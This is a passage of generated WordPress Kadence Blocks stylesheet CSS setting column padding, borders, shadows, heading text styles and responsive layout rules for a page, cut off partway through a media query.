.kt-inside-inner-col{box-shadow:rgba(0, 0, 0, 0.2) 0px 0px 14px 0px;}.kadence-column76_16865c-7b > .kt-inside-inner-col{column-gap:var(--global-kb-gap-sm, 1rem);}.kadence-column76_16865c-7b > .kt-inside-inner-col{flex-direction:column;}.kadence-column76_16865c-7b > .kt-inside-inner-col > .aligncenter{width:100%;}.kadence-column76_16865c-7b, .kt-inside-inner-col > .kadence-column76_16865c-7b:not(.specificity){margin-right:20px;margin-left:20px;}@media all and (max-width: 1024px){.kadence-column76_16865c-7b > .kt-inside-inner-col{flex-direction:column;justify-content:center;}}@media all and (max-width: 767px){.kadence-column76_16865c-7b > .kt-inside-inner-col{flex-direction:column;justify-content:center;}}.kadence-column76_bc7c9e-13 > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;}.kadence-column76_bc7c9e-13 > .kt-inside-inner-col{column-gap:var(--global-kb-gap-sm, 1rem);}.kadence-column76_bc7c9e-13 > .kt-inside-inner-col{flex-direction:column;}.kadence-column76_bc7c9e-13 > .kt-inside-inner-col > .aligncenter{width:100%;}.kadence-column76_bc7c9e-13 > .kt-inside-inner-col{background-color:#184678;}.kadence-column76_bc7c9e-13, .kt-inside-inner-col > .kadence-column76_bc7c9e-13:not(.specificity){margin-top:30px;margin-bottom:30px;}@media all and (max-width: 1024px){.kadence-column76_bc7c9e-13 > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;flex-direction:column;justify-content:center;}}@media all and (max-width: 767px){.kadence-column76_bc7c9e-13 > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;flex-direction:column;justify-content:center;}}.wp-block-kadence-advancedheading.kt-adv-heading76_4787d1-d4, .wp-block-kadence-advancedheading.kt-adv-heading76_4787d1-d4[data-kb-block="kb-adv-heading76_4787d1-d4"]{padding-bottom:2px;text-align:center;color:#ffffff;text-shadow:1px 1px 14px rgba(45,45,45,0.99);}.wp-block-kadence-advancedheading.kt-adv-heading76_4787d1-d4 mark.kt-highlight, .wp-block-kadence-advancedheading.kt-adv-heading76_4787d1-d4[data-kb-block="kb-adv-heading76_4787d1-d4"] mark.kt-highlight{-webkit-box-decoration-break:clone;box-decoration-break:clone;}.wp-block-kadence-advancedheading.kt-adv-heading76_4787d1-d4 img.kb-inline-image, .wp-block-kadence-advancedheading.kt-adv-heading76_4787d1-d4[data-kb-block="kb-adv-heading76_4787d1-d4"] img.kb-inline-image{width:150px;display:inline-block;}@media all and (max-width: 767px){.wp-block-kadence-advancedheading.kt-adv-heading76_4787d1-d4, .wp-block-kadence-advancedheading.kt-adv-heading76_4787d1-d4[data-kb-block="kb-adv-heading76_4787d1-d4"]{font-size:22px;}}.kb-row-layout-id76_cdd809-43 > .kt-row-column-wrap{padding-top:10px;padding-bottom:10px;grid-template-columns:minmax(0, 1fr);}@media all and (max-width: 767px){.kb-row-layout-id76_cdd809-43 > .kt-row-column-wrap{grid-template-columns:minmax(0, 1fr);}}.kadence-column76_66363d-6f > .kt-inside-inner-col{padding-top:20px;padding-right:15px;padding-bottom:20px;padding-left:15px;}.kadence-column76_66363d-6f > .kt-inside-inner-col{box-shadow:rgba(0, 0, 0, 0.2) 0px 0px 14px 0px;}.kadence-column76_66363d-6f > .kt-inside-inner-col{column-gap:var(--global-kb-gap-sm, 1rem);}.kadence-column76_66363d-6f > .kt-inside-inner-col{flex-direction:column;}.kadence-column76_66363d-6f > .kt-inside-inner-col > .aligncenter{width:100%;}.kadence-column76_66363d-6f, .kt-inside-inner-col > .kadence-column76_66363d-6f:not(.specificity){margin-right:20px;margin-left:20px;}@media all and (max-width: 1024px){.kadence-column76_66363d-6f > .kt-inside-inner-col{flex-direction:column;justify-content:center;}}@media all and (max-width: 767px){.kadence-column76_66363d-6f > .kt-inside-inner-col{flex-direction:column;justify-content:center;}}.kadence-column76_b2145c-4b > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;}.kadence-column76_b2145c-4b > .kt-inside-inner-col{column-gap:var(--global-kb-gap-sm, 1rem);}.kadence-column76_b2145c-4b > .kt-inside-inner-col{flex-direction:column;}.kadence-column76_b2145c-4b > .kt-inside-inner-col > .aligncenter{width:100%;}.kadence-column76_b2145c-4b > .kt-inside-inner-col{background-color:#184678;}.kadence-column76_b2145c-4b, .kt-inside-inner-col > .kadence-column76_b2145c-4b:not(.specificity){margin-top:30px;margin-bottom:30px;}@media all and (max-width: 1024px){.kadence-column76_b2145c-4b > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;flex-direction:column;justify-content:center;}}@media all and (max-width: 767px){.kadence-column76_b2145c-4b > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;flex-direction:column;justify-content:center;}}.wp-block-kadence-advancedheading.kt-adv-heading76_2a07e6-ec, .wp-block-kadence-advancedheading.kt-adv-heading76_2a07e6-ec[data-kb-block="kb-adv-heading76_2a07e6-ec"]{padding-bottom:2px;text-align:center;color:#ffffff;text-shadow:1px 1px 14px rgba(45,45,45,0.99);}.wp-block-kadence-advancedheading.kt-adv-heading76_2a07e6-ec mark.kt-highlight, .wp-block-kadence-advancedheading.kt-adv-heading76_2a07e6-ec[data-kb-block="kb-adv-heading76_2a07e6-ec"] mark.kt-highlight{-webkit-box-decoration-break:clone;box-decoration-break:clone;}.wp-block-kadence-advancedheading.kt-adv-heading76_2a07e6-ec img.kb-inline-image, .wp-block-kadence-advancedheading.kt-adv-heading76_2a07e6-ec[data-kb-block="kb-adv-heading76_2a07e6-ec"] img.kb-inline-image{width:150px;display:inline-block;}@media all and (max-width: 767px){.wp-block-kadence-advancedheading.kt-adv-heading76_2a07e6-ec, .wp-block-kadence-advancedheading.kt-adv-heading76_2a07e6-ec[data-kb-block="kb-adv-heading76_2a07e6-ec"]{font-size:22px;}}.kb-row-layout-id76_0a1f92-bf > .kt-row-column-wrap{padding-top:10px;padding-bottom:10px;grid-template-columns:minmax(0, 1fr);}@media all and (max-width: 767px){.kb-row-layout-id76_0a1f92-bf > .kt-row-column-wrap{grid-template-columns:minmax(0, 1fr);}}.kadence-column76_f80d77-59 > .kt-inside-inner-col{padding-top:20px;padding-right:15px;padding-bottom:20px;padding-left:15px;}.kadence-column76_f80d77-59 > .kt-inside-inner-col{box-shadow:rgba(0, 0, 0, 0.2) 0px 0px 14px 0px;}.kadence-column76_f80d77-59 > .kt-inside-inner-col{column-gap:var(--global-kb-gap-sm, 1rem);}.kadence-column76_f80d77-59 > .kt-inside-inner-col{flex-direction:column;}.kadence-column76_f80d77-59 > .kt-inside-inner-col > .aligncenter{width:100%;}.kadence-column76_f80d77-59, .kt-inside-inner-col > .kadence-column76_f80d77-59:not(.specificity){margin-right:20px;margin-left:20px;}@media all and (max-width: 1024px){.kadence-column76_f80d77-59 > .kt-inside-inner-col{flex-direction:column;justify-content:center;}}@media all and (max-width: 767px){.kadence-column76_f80d77-59 > .kt-inside-inner-col{flex-direction:column;justify-content:center;}}.kadence-column76_5b8681-f6 > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;}.kadence-column76_5b8681-f6 > .kt-inside-inner-col{column-gap:var(--global-kb-gap-sm, 1rem);}.kadence-column76_5b8681-f6 > .kt-inside-inner-col{flex-direction:column;}.kadence-column76_5b8681-f6 > .kt-inside-inner-col > .aligncenter{width:100%;}.kadence-column76_5b8681-f6 > .kt-inside-inner-col{background-color:#184678;}.kadence-column76_5b8681-f6, .kt-inside-inner-col > .kadence-column76_5b8681-f6:not(.specificity){margin-top:30px;margin-bottom:30px;}@media all and (max-width: 1024px){.kadence-column76_5b8681-f6 > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;flex-direction:column;justify-content:center;}}@media all and (max-width: 767px){.kadence-column76_5b8681-f6 > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;flex-direction:column;justify-content:center;}}.wp-block-kadence-advancedheading.kt-adv-heading76_d45b6a-65, .wp-block-kadence-advancedheading.kt-adv-heading76_d45b6a-65[data-kb-block="kb-adv-heading76_d45b6a-65"]{padding-bottom:2px;text-align:center;color:#ffffff;text-shadow:1px 1px 14px rgba(45,45,45,0.99);}.wp-block-kadence-advancedheading.kt-adv-heading76_d45b6a-65 mark.kt-highlight, .wp-block-kadence-advancedheading.kt-adv-heading76_d45b6a-65[data-kb-block="kb-adv-heading76_d45b6a-65"] mark.kt-highlight{-webkit-box-decoration-break:clone;box-decoration-break:clone;}.wp-block-kadence-advancedheading.kt-adv-heading76_d45b6a-65 img.kb-inline-image, .wp-block-kadence-advancedheading.kt-adv-heading76_d45b6a-65[data-kb-block="kb-adv-heading76_d45b6a-65"] img.kb-inline-image{width:150px;display:inline-block;}@media all and (max-width: 767px){.wp-block-kadence-advancedheading.kt-adv-heading76_d45b6a-65, .wp-block-kadence-advancedheading.kt-adv-heading76_d45b6a-65[data-kb-block="kb-adv-heading76_d45b6a-65"]{font-size:22px;}}.wp-block-kadence-image.kb-image76_d2b310-44:not(.kb-specificity-added):not(.kb-extra-specificity-added){margin-bottom:30px;}.kb-image76_d2b310-44 .kb-image-has-overlay:after{opacity:0.3;}.kb-image76_d2b310-44 img.kb-img, .kb-image76_d2b310-44 .kb-img img{border-top:5px solid var(--global-palette2, #2B6CB0);border-right:5px solid var(--global-palette2, #2B6CB0);border-bottom:5px solid var(--global-palette2, #2B6CB0);border-left:5px solid var(--global-palette2, #2B6CB0);box-shadow:2px 2px 14px 0px #244893;}@media all and (max-width: 1024px){.kb-image76_d2b310-44 img.kb-img, .kb-image76_d2b310-44 .kb-img img{border-top:5px solid var(--global-palette2, #2B6CB0);border-right:5px solid var(--global-palette2, #2B6CB0);border-bottom:5px solid var(--global-palette2, #2B6CB0);border-left:5px solid var(--global-palette2, #2B6CB0);}}@media all and (max-width: 767px){.kb-image76_d2b310-44.kb-image-is-ratio-size, .kb-image76_d2b310-44 .kb-image-is-ratio-size{max-width:150px;width:100%;}.kb-image76_d2b310-44 figure{max-width:150px;}.kb-image76_d2b310-44 img.kb-img, .kb-image76_d2b310-44 .kb-img img{border-top:5px solid var(--global-palette2, #2B6CB0);border-right:5px solid var(--global-palette2, #2B6CB0);border-bottom:5px solid var(--global-palette2, #2B6CB0);border-left:5px solid var(--global-palette2, #2B6CB0);}}.kb-row-layout-id76_bd9af3-4c > .kt-row-column-wrap{padding-top:10px;padding-bottom:10px;grid-template-columns:minmax(0, 1fr);}@media all and (max-width: 767px){.kb-row-layout-id76_bd9af3-4c > .kt-row-column-wrap{grid-template-columns:minmax(0, 1fr);}}.kadence-column76_259024-a8 > .kt-inside-inner-col{padding-top:20px;padding-right:15px;padding-bottom:20px;padding-left:15px;}.kadence-column76_259024-a8 > .kt-inside-inner-col{box-shadow:rgba(0, 0, 0, 0.2) 0px 0px 14px 0px;}.kadence-column76_259024-a8 > .kt-inside-inner-col{column-gap:var(--global-kb-gap-sm, 1rem);}.kadence-column76_259024-a8 > .kt-inside-inner-col{flex-direction:column;}.kadence-column76_259024-a8 > .kt-inside-inner-col > .aligncenter{width:100%;}.kadence-column76_259024-a8, .kt-inside-inner-col > .kadence-column76_259024-a8:not(.specificity){margin-right:20px;margin-left:20px;}@media all and (max-width: 1024px){.kadence-column76_259024-a8 > .kt-inside-inner-col{flex-direction:column;justify-content:center;}}@media all and (max-width: 767px){.kadence-column76_259024-a8 > .kt-inside-inner-col{flex-direction:column;justify-content:center;}}.kadence-column76_1a2e90-f1 > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;}.kadence-column76_1a2e90-f1 > .kt-inside-inner-col{column-gap:var(--global-kb-gap-sm, 1rem);}.kadence-column76_1a2e90-f1 > .kt-inside-inner-col{flex-direction:column;}.kadence-column76_1a2e90-f1 > .kt-inside-inner-col > .aligncenter{width:100%;}.kadence-column76_1a2e90-f1 > .kt-inside-inner-col{background-color:#184678;}.kadence-column76_1a2e90-f1, .kt-inside-inner-col > .kadence-column76_1a2e90-f1:not(.specificity){margin-top:30px;margin-bottom:30px;}@media all and (max-width: 1024px){.kadence-column76_1a2e90-f1 > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;flex-direction:column;justify-content:center;}}@media all and (max-width: 767px){.kadence-column76_1a2e90-f1 > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;flex-direction:column;justify-content:center;}}.wp-block-kadence-advancedheading.kt-adv-heading76_24d096-f5, .wp-block-kadence-advancedheading.kt-adv-heading76_24d096-f5[data-kb-block="kb-adv-heading76_24d096-f5"]{padding-bottom:2px;text-align:center;color:#ffffff;text-shadow:1px 1px 14px rgba(45,45,45,0.99);}.wp-block-kadence-advancedheading.kt-adv-heading76_24d096-f5 mark.kt-highlight, .wp-block-kadence-advancedheading.kt-adv-heading76_24d096-f5[data-kb-block="kb-adv-heading76_24d096-f5"] mark.kt-highlight{-webkit-box-decoration-break:clone;box-decoration-break:clone;}.wp-block-kadence-advancedheading.kt-adv-heading76_24d096-f5 img.kb-inline-image, .wp-block-kadence-advancedheading.kt-adv-heading76_24d096-f5[data-kb-block="kb-adv-heading76_24d096-f5"] img.kb-inline-image{width:150px;display:inline-block;}@media all and (max-width: 767px){.wp-block-kadence-advancedheading.kt-adv-heading76_24d096-f5, .wp-block-kadence-advancedheading.kt-adv-heading76_24d096-f5[data-kb-block="kb-adv-heading76_24d096-f5"]{font-size:22px;}}.kb-row-layout-id76_e182d8-77 > .kt-row-column-wrap{padding-top:10px;padding-bottom:10px;grid-template-columns:minmax(0, 1fr);}@media all and (max-width: 767px){.kb-row-layout-id76_e182d8-77 > .kt-row-column-wrap{grid-template-columns:minmax(0, 1fr);}}.kadence-column76_3babba-8a > .kt-inside-inner-col{padding-top:20px;padding-right:15px;padding-bottom:20px;padding-left:15px;}.kadence-column76_3babba-8a > .kt-inside-inner-col{box-shadow:rgba(0, 0, 0, 0.2) 0px 0px 14px 0px;}.kadence-column76_3babba-8a > .kt-inside-inner-col{column-gap:var(--global-kb-gap-sm, 1rem);}.kadence-column76_3babba-8a > .kt-inside-inner-col{flex-direction:column;}.kadence-column76_3babba-8a > .kt-inside-inner-col > .aligncenter{width:100%;}.kadence-column76_3babba-8a, .kt-inside-inner-col > .kadence-column76_3babba-8a:not(.specificity){margin-right:20px;margin-left:20px;}@media all and (max-width: 1024px){.kadence-column76_3babba-8a > .kt-inside-inner-col{flex-direction:column;justify-content:center;}}@media all and (max-width: 767px){.kadence-column76_3babba-8a > .kt-inside-inner-col{flex-direction:column;justify-content:center;}}.kadence-column76_b8c032-65 > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;}.kadence-column76_b8c032-65 > .kt-inside-inner-col{column-gap:var(--global-kb-gap-sm, 1rem);}.kadence-column76_b8c032-65 > .kt-inside-inner-col{flex-direction:column;}.kadence-column76_b8c032-65 > .kt-inside-inner-col > .aligncenter{width:100%;}.kadence-column76_b8c032-65 > .kt-inside-inner-col{background-color:#184678;}.kadence-column76_b8c032-65, .kt-inside-inner-col > .kadence-column76_b8c032-65:not(.specificity){margin-top:30px;margin-bottom:30px;}@media all and (max-width: 1024px){.kadence-column76_b8c032-65 > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;flex-direction:column;justify-content:center;}}@media all and (max-width: 767px){.kadence-column76_b8c032-65 > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;flex-direction:column;justify-content:center;}}.wp-block-kadence-advancedheading.kt-adv-heading76_0d46f0-4d, .wp-block-kadence-advancedheading.kt-adv-heading76_0d46f0-4d[data-kb-block="kb-adv-heading76_0d46f0-4d"]{padding-bottom:2px;text-align:center;color:#ffffff;text-shadow:1px 1px 14px rgba(45,45,45,0.99);}.wp-block-kadence-advancedheading.kt-adv-heading76_0d46f0-4d mark.kt-highlight, .wp-block-kadence-advancedheading.kt-adv-heading76_0d46f0-4d[data-kb-block="kb-adv-heading76_0d46f0-4d"] mark.kt-highlight{-webkit-box-decoration-break:clone;box-decoration-break:clone;}.wp-block-kadence-advancedheading.kt-adv-heading76_0d46f0-4d img.kb-inline-image, .wp-block-kadence-advancedheading.kt-adv-heading76_0d46f0-4d[data-kb-block="kb-adv-heading76_0d46f0-4d"] img.kb-inline-image{width:150px;display:inline-block;}@media all and (max-width: 767px){.wp-block-kadence-advancedheading.kt-adv-heading76_0d46f0-4d, .wp-block-kadence-advancedheading.kt-adv-heading76_0d46f0-4d[data-kb-block="kb-adv-heading76_0d46f0-4d"]{font-size:22px;}}.kb-row-layout-id76_d7b834-fb > .kt-row-column-wrap{padding-top:10px;padding-bottom:10px;grid-template-columns:minmax(0, 1fr);}@media all and (max-width: 767px){.kb-row-layout-id76_d7b834-fb > .kt-row-column-wrap{grid-template-columns:minmax(0, 1fr);}}.kadence-column76_98d9bd-8b > .kt-inside-inner-col{padding-top:20px;padding-right:15px;padding-bottom:20px;padding-left:15px;}.kadence-column76_98d9bd-8b > .kt-inside-inner-col{box-shadow:rgba(0, 0, 0, 0.2) 0px 0px 14px 0px;}.kadence-column76_98d9bd-8b > .kt-inside-inner-col{column-gap:var(--global-kb-gap-sm, 1rem);}.kadence-column76_98d9bd-8b > .kt-inside-inner-col{flex-direction:column;}.kadence-column76_98d9bd-8b > .kt-inside-inner-col > .aligncenter{width:100%;}.kadence-column76_98d9bd-8b, .kt-inside-inner-col > .kadence-column76_98d9bd-8b:not(.specificity){margin-right:20px;margin-left:20px;}@media all and (max-width: 1024px){.kadence-column76_98d9bd-8b > .kt-inside-inner-col{flex-direction:column;justify-content:center;}}@media all and (max-width: 767px){.kadence-column76_98d9bd-8b > .kt-inside-inner-col{flex-direction:column;justify-content:center;}}.kadence-column76_172e6c-25 > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;}.kadence-column76_172e6c-25 > .kt-inside-inner-col{column-gap:var(--global-kb-gap-sm, 1rem);}.kadence-column76_172e6c-25 > .kt-inside-inner-col{flex-direction:column;}.kadence-column76_172e6c-25 > .kt-inside-inner-col > .aligncenter{width:100%;}.kadence-column76_172e6c-25 > .kt-inside-inner-col{background-color:#184678;}.kadence-column76_172e6c-25, .kt-inside-inner-col > .kadence-column76_172e6c-25:not(.specificity){margin-top:30px;margin-bottom:30px;}@media all and (max-width: 1024px){.kadence-column76_172e6c-25 > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;flex-direction:column;justify-content:center;}}@media all and (max-width: 767px){.kadence-column76_172e6c-25 > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;flex-direction:column;justify-content:center;}}.wp-block-kadence-advancedheading.kt-adv-heading76_ae2c0f-15, .wp-block-kadence-advancedheading.kt-adv-heading76_ae2c0f-15[data-kb-block="kb-adv-heading76_ae2c0f-15"]{padding-bottom:2px;text-align:center;color:#ffffff;text-shadow:1px 1px 14px rgba(45,45,45,0.99);}.wp-block-kadence-advancedheading.kt-adv-heading76_ae2c0f-15 mark.kt-highlight, .wp-block-kadence-advancedheading.kt-adv-heading76_ae2c0f-15[data-kb-block="kb-adv-heading76_ae2c0f-15"] mark.kt-highlight{-webkit-box-decoration-break:clone;box-decoration-break:clone;}.wp-block-kadence-advancedheading.kt-adv-heading76_ae2c0f-15 img.kb-inline-image, .wp-block-kadence-advancedheading.kt-adv-heading76_ae2c0f-15[data-kb-block="kb-adv-heading76_ae2c0f-15"] img.kb-inline-image{width:150px;display:inline-block;}@media all and (max-width: 767px){.wp-block-kadence-advancedheading.kt-adv-heading76_ae2c0f-15, .wp-block-kadence-advancedheading.kt-adv-heading76_ae2c0f-15[data-kb-block="kb-adv-heading76_ae2c0f-15"]{font-size:22px;}}.wp-block-kadence-image.kb-image76_f2e9ee-d2:not(.kb-specificity-added):not(.kb-extra-specificity-added){margin-bottom:30px;}.kb-image76_f2e9ee-d2 .kb-image-has-overlay:after{opacity:0.3;}.kb-image76_f2e9ee-d2 img.kb-img, .kb-image76_f2e9ee-d2 .kb-img img{border-top:5px solid var(--global-palette2, #2B6CB0);border-right:5px solid var(--global-palette2, #2B6CB0);border-bottom:5px solid var(--global-palette2, #2B6CB0);border-left:5px solid var(--global-palette2, #2B6CB0);box-shadow:2px 2px 14px 0px #244893;}@media all and (max-width: 1024px){.kb-image76_f2e9ee-d2 img.kb-img, .kb-image76_f2e9ee-d2 .kb-img img{border-top:5px solid var(--global-palette2, #2B6CB0);border-right:5px solid var(--global-palette2, #2B6CB0);border-bottom:5px solid var(--global-palette2, #2B6CB0);border-left:5px solid var(--global-palette2, #2B6CB0);}}@media all and (max-width: 767px){.kb-image76_f2e9ee-d2.kb-image-is-ratio-size, .kb-image76_f2e9ee-d2 .kb-image-is-ratio-size{max-width:150px;width:100%;}.kb-image76_f2e9ee-d2 figure{max-width:150px;}.kb-image76_f2e9ee-d2 img.kb-img, .kb-image76_f2e9ee-d2 .kb-img img{border-top:5px solid var(--global-palette2, #2B6CB0);border-right:5px solid var(--global-palette2, #2B6CB0);border-bottom:5px solid var(--global-palette2, #2B6CB0);border-left:5px solid var(--global-palette2, #2B6CB0);}}.kb-row-layout-id76_e332da-0f > .kt-row-column-wrap{padding-top:10px;padding-bottom:10px;grid-template-columns:minmax(0, 1fr);}@media all and (max-width: 767px){.kb-row-layout-id76_e332da-0f > .kt-row-column-wrap{grid-template-columns:minmax(0, 1fr);}}.kadence-column76_fe0a04-9a > .kt-inside-inner-col{padding-top:20px;padding-right:15px;padding-bottom:20px;padding-left:15px;}.kadence-column76_fe0a04-9a > .kt-inside-inner-col{box-shadow:rgba(0, 0, 0, 0.2) 0px 0px 14px 0px;}.kadence-column76_fe0a04-9a > .kt-inside-inner-col{column-gap:var(--global-kb-gap-sm, 1rem);}.kadence-column76_fe0a04-9a > .kt-inside-inner-col{flex-direction:column;}.kadence-column76_fe0a04-9a > .kt-inside-inner-col > .aligncenter{width:100%;}.kadence-column76_fe0a04-9a, .kt-inside-inner-col > .kadence-column76_fe0a04-9a:not(.specificity){margin-right:20px;margin-left:20px;}@media all and (max-width: 1024px){.kadence-column76_fe0a04-9a > .kt-inside-inner-col{flex-direction:column;justify-content:center;}}@media all and (max-width: 767px){.kadence-column76_fe0a04-9a > .kt-inside-inner-col{flex-direction:column;justify-content:center;}}.kadence-column76_7daea6-fa > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;}.kadence-column76_7daea6-fa > .kt-inside-inner-col{column-gap:var(--global-kb-gap-sm, 1rem);}.kadence-column76_7daea6-fa > .kt-inside-inner-col{flex-direction:column;}.kadence-column76_7daea6-fa > .kt-inside-inner-col > .aligncenter{width:100%;}.kadence-column76_7daea6-fa > .kt-inside-inner-col{background-color:#184678;}.kadence-column76_7daea6-fa, .kt-inside-inner-col > .kadence-column76_7daea6-fa:not(.specificity){margin-top:30px;margin-bottom:30px;}@media all and (max-width: 1024px){.kadence-column76_7daea6-fa > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;flex-direction:column;justify-content:center;}}@media all and (max-width: 767px){.kadence-column76_7daea6-fa > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;flex-direction:column;justify-content:center;}}.wp-block-kadence-advancedheading.kt-adv-heading76_7a9c9e-21, .wp-block-kadence-advancedheading.kt-adv-heading76_7a9c9e-21[data-kb-block="kb-adv-heading76_7a9c9e-21"]{padding-bottom:2px;text-align:center;color:#ffffff;text-shadow:1px 1px 14px rgba(45,45,45,0.99);}.wp-block-kadence-advancedheading.kt-adv-heading76_7a9c9e-21 mark.kt-highlight, .wp-block-kadence-advancedheading.kt-adv-heading76_7a9c9e-21[data-kb-block="kb-adv-heading76_7a9c9e-21"] mark.kt-highlight{-webkit-box-decoration-break:clone;box-decoration-break:clone;}.wp-block-kadence-advancedheading.kt-adv-heading76_7a9c9e-21 img.kb-inline-image, .wp-block-kadence-advancedheading.kt-adv-heading76_7a9c9e-21[data-kb-block="kb-adv-heading76_7a9c9e-21"] img.kb-inline-image{width:150px;display:inline-block;}@media all and (max-width: 767px){.wp-block-kadence-advancedheading.kt-adv-heading76_7a9c9e-21, .wp-block-kadence-advancedheading.kt-adv-heading76_7a9c9e-21[data-kb-block="kb-adv-heading76_7a9c9e-21"]{font-size:22px;}}.kb-row-layout-id76_514d9f-6e > .kt-row-column-wrap{padding-top:10px;padding-bottom:10px;grid-template-columns:minmax(0, 1fr);}@media all and (max-width: 767px){.kb-row-layout-id76_514d9f-6e > .kt-row-column-wrap{grid-template-columns:minmax(0, 1fr);}}.kadence-column76_b9fcb8-2c > .kt-inside-inner-col{padding-top:20px;padding-right:15px;padding-bottom:20px;padding-left:15px;}.kadence-column76_b9fcb8-2c > .kt-inside-inner-col{box-shadow:rgba(0, 0, 0, 0.2) 0px 0px 14px 0px;}.kadence-column76_b9fcb8-2c > .kt-inside-inner-col{column-gap:var(--global-kb-gap-sm, 1rem);}.kadence-column76_b9fcb8-2c > .kt-inside-inner-col{flex-direction:column;}.kadence-column76_b9fcb8-2c > .kt-inside-inner-col > .aligncenter{width:100%;}.kadence-column76_b9fcb8-2c, .kt-inside-inner-col > .kadence-column76_b9fcb8-2c:not(.specificity){margin-right:20px;margin-left:20px;}@media all and (max-width: 1024px){.kadence-column76_b9fcb8-2c > .kt-inside-inner-col{flex-direction:column;justify-content:center;}}@media all and (max-width: 767px){.kadence-column76_b9fcb8-2c > .kt-inside-inner-col{flex-direction:column;justify-content:center;}}.kadence-column76_52be1a-6b > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;}.kadence-column76_52be1a-6b > .kt-inside-inner-col{column-gap:var(--global-kb-gap-sm, 1rem);}.kadence-column76_52be1a-6b > .kt-inside-inner-col{flex-direction:column;}.kadence-column76_52be1a-6b > .kt-inside-inner-col > .aligncenter{width:100%;}.kadence-column76_52be1a-6b > .kt-inside-inner-col{background-color:#184678;}.kadence-column76_52be1a-6b, .kt-inside-inner-col > .kadence-column76_52be1a-6b:not(.specificity){margin-top:30px;margin-bottom:30px;}@media all and (max-width: 1024px){.kadence-column76_52be1a-6b > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;flex-direction:column;justify-content:center;}}@media all and (max-width: 767px){.kadence-column76_52be1a-6b > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;flex-direction:column;justify-content:center;}}.wp-block-kadence-advancedheading.kt-adv-heading76_e2728e-e6, .wp-block-kadence-advancedheading.kt-adv-heading76_e2728e-e6[data-kb-block="kb-adv-heading76_e2728e-e6"]{padding-bottom:2px;text-align:center;color:#ffffff;text-shadow:1px 1px 14px rgba(45,45,45,0.99);}.wp-block-kadence-advancedheading.kt-adv-heading76_e2728e-e6 mark.kt-highlight, .wp-block-kadence-advancedheading.kt-adv-heading76_e2728e-e6[data-kb-block="kb-adv-heading76_e2728e-e6"] mark.kt-highlight{-webkit-box-decoration-break:clone;box-decoration-break:clone;}.wp-block-kadence-advancedheading.kt-adv-heading76_e2728e-e6 img.kb-inline-image, .wp-block-kadence-advancedheading.kt-adv-heading76_e2728e-e6[data-kb-block="kb-adv-heading76_e2728e-e6"] img.kb-inline-image{width:150px;display:inline-block;}@media all and (max-width: 767px){.wp-block-kadence-advancedheading.kt-adv-heading76_e2728e-e6, .wp-block-kadence-advancedheading.kt-adv-heading76_e2728e-e6[data-kb-block="kb-adv-heading76_e2728e-e6"]{font-size:22px;}}.kb-row-layout-id76_88779c-26 > .kt-row-column-wrap{padding-top:10px;padding-bottom:10px;grid-template-columns:minmax(0, 1fr);}@media all and (max-width: 767px){.kb-row-layout-id76_88779c-26 > .kt-row-column-wrap{grid-template-columns:minmax(0, 1fr);}}.kadence-column76_6b02ee-d0 > .kt-inside-inner-col{padding-top:20px;padding-right:15px;padding-bottom:20px;padding-left:15px;}.kadence-column76_6b02ee-d0 > .kt-inside-inner-col{box-shadow:rgba(0, 0, 0, 0.2) 0px 0px 14px 0px;}.kadence-column76_6b02ee-d0 > .kt-inside-inner-col{column-gap:var(--global-kb-gap-sm, 1rem);}.kadence-column76_6b02ee-d0 > .kt-inside-inner-col{flex-direction:column;}.kadence-column76_6b02ee-d0 > .kt-inside-inner-col > .aligncenter{width:100%;}.kadence-column76_6b02ee-d0, .kt-inside-inner-col > .kadence-column76_6b02ee-d0:not(.specificity){margin-right:20px;margin-left:20px;}@media all and 